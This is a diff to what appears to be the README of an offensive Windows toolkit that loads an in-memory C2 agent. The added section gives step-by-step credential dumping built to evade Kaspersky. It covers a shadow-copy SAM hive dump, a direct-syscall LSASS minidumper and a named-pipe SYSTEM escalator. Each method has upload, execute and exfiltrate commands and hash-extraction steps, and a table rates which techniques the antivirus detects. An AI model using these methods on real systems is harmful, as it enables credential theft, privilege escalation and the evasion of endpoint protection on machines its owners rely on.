@@ -20,6 +20,12 @@ All methods load a reflective DLL C2 agent in-memory. Nothing malicious written 
 | **Agent `dll inject` / `dll spawn`** | ✅ WORKS | Best — uses indirect syscalls |
 | **Native C loader — Hell's Gate direct syscalls** | ✅ WORKS | Single EXE, no PS, no .NET |
 | AMSI bypass (amsiContext null) | ✅ WORKS | Required before PS loaders |
+| **VSS shadow copy SAM dump** | ✅ WORKS | Bypasses file minifilter |
+| Direct syscall LSASS dump (no dbghelp) | ⚠️ NEEDS SYSTEM | Bypasses klhk.dll; kernel ObCallbacks still fire for low-priv |
+| Named pipe SYSTEM escalation (custom) | ✅ WORKS | SeImpersonatePrivilege required |
+| `reg save HKLM\SAM` | ❌ DETECTED | Kernel registry callback |
+| GodPotato, PrintSpoofer (known binaries) | ❌ DETECTED | Static signature |
+| Backup semantics file read | ❌ DETECTED | Kernel file minifilter on config/ |
 
 ---
 
@@ -194,6 +200,11 @@ iex([IO.File]::ReadAllText("C:\Windows\Temp\payload.dat"))
 ```
 generators/
   gen_sh.py          — native C loader, Hell's Gate direct syscalls (WORKS — see Method 4)
+  gen_samread.py     — SAM hive reader via SeBackupPrivilege + backup semantics
+  gen_minidump.py    — LSASS dumper: direct syscalls + manual minidump, no dbghelp.dll
+  gen_elevate.py     — SYSTEM escalation: named pipe + schtask, no GodPotato
+  gen_lsadump.py     — LSASS dumper v1 (dbghelp.dll — detected, reference only)
+  vss_sam.ps1        — VSS shadow copy SAM/SYSTEM/SECURITY dump (WORKS)
   gen_paste.py       — generates chunked paste commands from your DLL
   gen_msbuild.py     — generates MSBuild proj.xml
   gen_persist.py     — generates persistence setup commands (all 3 approaches)
@@ -284,6 +295,109 @@ Kaspersky's behavioral engine flags `VirtualAlloc(RWX)` (classic shellcode patte
 - Host header: `graph.microsoft.com`
 - Kaspersky's network DPI does not block this pattern
 - SSL MITM: Kaspersky intercepts HTTPS on standard ports. Use a non-standard port (8080) with custom traffic — not intercepted.
+
+---
+
+## Method 5 — Credential Dumping (Kaspersky-Bypassed)
+
+Confirmed working against **Kaspersky 21.x + Windows 11 24H2**. All standard approaches are blocked at kernel level.
+
+### What Kaspersky blocks at kernel level
+
+| Technique | Layer blocked | Notes |
+|---|---|---|
+| `reg save HKLM\SAM` | Registry callback (kernel) | Detected immediately |
+| `NtOpenProcess(lsass)` direct syscall | ObRegisterCallbacks (kernel) | Callbacks strip PROCESS_VM_READ even with direct syscalls |
+| `MiniDumpWriteDump` (dbghelp.dll) | Static signature + kernel | Quarantined on upload |
+| `GodPotato`, `PrintSpoofer` | Static signature | Quarantined on upload |
+| Backup semantics file read (`FILE_FLAG_BACKUP_SEMANTICS`) | File minifilter (kernel) | Blocks access to `C:\Windows\System32\config\*` |
+
+**Key insight:** Direct syscalls bypass klhk.dll (user-mode hooks) but NOT `avp.sys` kernel callbacks (`ObRegisterCallbacks`, file minifilters, registry callbacks). Different problem, different solution.
+
+---
+
+### Method 5a — VSS Shadow Copy SAM Dump ✅ WORKS
+
+Reads hive files from a VSS snapshot volume — different driver path, not monitored by Kaspersky's file minifilter.
+
+```bash
+# Generate and upload the script
+# File: generators/vss_sam.ps1
+```
+
+**Deploy:**
+```
+upload generators/vss_sam.ps1 C:\Windows\Temp\vss_sam.ps1
+powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\vss_sam.ps1
+download C:\Windows\Temp\s.dat
+download C:\Windows\Temp\y.dat
+download C:\Windows\Temp\e.dat
+```
+
+**Parse on Kali:**
+```bash
+impacket-secretsdump -sam s.dat -system y.dat -security e.dat LOCAL
+```
+
+**Yields:** Local NTLM hashes, LSA secrets, DPAPI machine/user keys.
+
+**Why it works:** `Win32_ShadowCopy.Create()` mounts a snapshot as a separate volume (e.g. `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\`). Kaspersky's minifilter hooks the live `C:\Windows\System32\config\` path but does not monitor VSS snapshot volumes with the same rules.
+
+```bash
+python3 generators/gen_samread.py   # alternative: backup-semantics file reader
+```
+
+---
+
+### Method 5b — LSASS Minidump via Direct Syscalls (no dbghelp.dll) ⚠️ REQUIRES SYSTEM or SeDebugPrivilege
+
+Bypasses klhk.dll hooks. Still blocked by kernel ObCallbacks unless running as SYSTEM.
+
+```bash
+python3 generators/gen_minidump.py   # builds minidump.exe — no dbghelp.dll
+```
+
+Uses:
+- `NtOpenProcess` via Hell's Gate direct syscall (bypasses klhk.dll)
+- `NtQueryVirtualMemory` via direct syscall (enumerate regions)
+- `NtReadVirtualMemory` via direct syscall (read pages)
+- Manual MINIDUMP format construction (no dbghelp.dll = no static signature)
+
+**Deploy (requires SYSTEM session):**
+```
+upload bypass/minidump.exe C:\Windows\Temp\minidump.exe
+shell C:\Windows\Temp\minidump.exe
+download C:\Windows\Temp\lsass.dat
+```
+
+```bash
+pypykatz lsa minidump lsass.dat
+```
+
+---
+
+### Method 5c — SYSTEM Escalation via Named Pipe + Scheduled Task
+
+Custom SeImpersonatePrivilege escalator — no GodPotato, no known signatures.
+
+```bash
+python3 generators/gen_elevate.py   # builds elevate.exe
+```
+
+**Flow:**
+1. Creates named pipe `\\.\pipe\<random>`
+2. Schedules SYSTEM task: `cmd /c echo.>\\.\pipe\<random>`
+3. Runs task → SYSTEM process connects to pipe
+4. `ImpersonateNamedPipeClient` → `DuplicateTokenEx` → SYSTEM primary token
+5. `CreateProcessWithTokenW` → runs `rundll32 comsvcs.dll,MiniDump <lsass_pid>` as SYSTEM
+
+**Requirements:** `SeImpersonatePrivilege` (Enabled) + local admin.
+
+```
+upload bypass/elevate.exe C:\Windows\Temp\elevate.exe
+shell C:\Windows\Temp\elevate.exe
+download C:\Windows\Temp\lsass.dat
+```
 
 ---
 
